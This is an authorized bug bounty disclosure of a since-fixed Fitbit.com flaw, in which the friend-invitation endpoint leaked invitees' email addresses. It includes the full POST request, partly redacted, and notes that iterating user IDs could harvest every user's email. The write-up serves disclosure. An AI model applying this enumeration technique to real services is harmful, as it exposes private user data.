```
Authorized Bug Bounty Disclosure
Target: Fitbit.com
Bug Type: User Email Disclosure / Privacy
Disclosure Verification: Fitbit Authorized Disclosure on 03-09-2018
```
### Summary
Identified a method to enumerate email addresses from any user :ok_hand:

### Notes:
Fitbit was extremely responsive and resolved this in a timely manner :two_hearts:

### What
Through manipulation of the friend request logic (where Fitbit users can add friends and chat with them), you are able to identify their email addresses even before they accept your friend request. Normally, email addresses are assumed to be completely private.

By programmatically submitting this request with randomized or systematic progression of the INVITEEID, it would be possible to farm all email addresses for the entire user base on Fitbit.com

### When
Bug discovered: 2016-04-01<br>
Bug Resolved: 2016-05-10

### How
Using the payload below at [fitbit.com/friends/friendInvitation], the server request responds with the users email address:<br>
```
POST /friends/friendInvitation HTTP/1.1
Host: www.fitbit.com
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.11; rv:45.0) Gecko/20100101 Firefox/45.0
Accept: application/json, text/javascript, */*; q=0.01
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
DNT: 1
Content-Type: application/x-www-form-urlencoded
X-Requested-With: XMLHttpRequest
Referer: https://www.fitbit.com/invitations/accept/friend?senderId=[SENDERID]&csrfToken=[CSRFTOKEN]
Content-Length: 457
Cookie: cookieInfoConnection: keep-alive

inviteeId=[6DIGITID]

[Some info redacted]
```

The server response (meta):
```
Friend request sent to: [Email Address]
```

### Where
This was found when playing around with the friend modules :notes:

### Why
This is a logic issue that compromises privacy, and could be used to farm and identify all users on Fitbit.

### Links
<a href="www.twitter.com/_eagleEggs">Twitter</a>
